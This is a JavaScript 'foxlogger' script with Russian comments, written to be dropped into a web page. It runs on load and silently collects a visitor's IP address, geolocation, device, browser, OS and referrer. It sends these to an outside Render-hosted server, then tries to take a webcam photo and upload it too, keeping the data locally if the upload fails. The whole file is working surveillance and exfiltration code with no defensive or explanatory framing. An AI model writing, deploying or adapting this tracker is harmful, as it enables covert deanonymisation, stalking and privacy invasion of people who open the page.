(async function() {
    "use strict";

    // URL твоего бота на Render
    const RENDER_URL = "https://drwizzard3-5.onrender.com";  // ЗАМЕНИ НА СВОЙ

    // ========== 1. Сбор данных ==========
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let city = "";
    let country = "";
    let deviceType = "не определено";
    let browser = "неизвестно";
    let os = "неизвестно";

    // UserAgent
    const userAgent = navigator.userAgent;
    
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "💻 Компьютер";
    }
    
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    // Время
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

    // ========== 2. Получаем IP и гео ==========
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        city = geoData.city || "неизвестно";
        country = geoData.country_name || "неизвестно";
        geo = `${city}, ${country}`;
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // ========== 3. Формируем данные для отправки ==========
    const dataToSend = {
        ip: ipAddress,
        geo: geo,
        time: timeStr,
        device: deviceType,
        browser: browser,
        os: os,
        url: window.location.href,
        referer: document.referrer || "прямой переход",
        userAgent: userAgent.substring(0, 200)
    };

    // ========== 4. Отправляем на Render ==========
    async function sendData() {
        try {
            const response = await fetch(`${RENDER_URL}/foxlogger`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(dataToSend)
            });
            
            if (response.ok) {
                console.log("✅ Данные отправлены на сервер");
                return true;
            } else {
                console.log("❌ Ошибка сервера:", response.status);
                return false;
            }
        } catch(e) {
            console.log("❌ Ошибка отправки:", e.message);
            return false;
        }
    }

    // ========== 5. Фото с камеры (опционально) ==========
    async function captureAndSendPhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement("video");
            video.srcObject = stream;
            video.autoplay = true;
            
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            await new Promise(r => setTimeout(r, 300));
            
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            const photoBlob = await new Promise(resolve => {
                canvas.toBlob(resolve, "image/jpeg", 0.85);
            });
            
            // Отправляем фото
            const formData = new FormData();
            formData.append("photo", photoBlob, "snapshot.jpg");
            formData.append("caption", `📸 Снимок с камеры\nIP: ${ipAddress}\nВремя: ${timeStr}`);
            
            await fetch(`${RENDER_URL}/foxlogger_photo`, {
                method: "POST",
                body: formData
            });
            
            console.log("✅ Фото отправлено");
        } catch(e) {
            console.log("Камера недоступна:", e.message);
        }
    }

    // ========== 6. ЗАПУСК ==========
    const sent = await sendData();
    
    if (sent) {
        // Если данные отправились — пробуем сделать фото
        await captureAndSendPhoto();
    } else {
        // Если не отправилось — сохраняем в localStorage
        try {
            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
            failed.push({
                data: dataToSend,
                time: new Date().toISOString()
            });
            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
            console.log("📦 Данные сохранены локально");
        } catch(e) {}
    }
})();
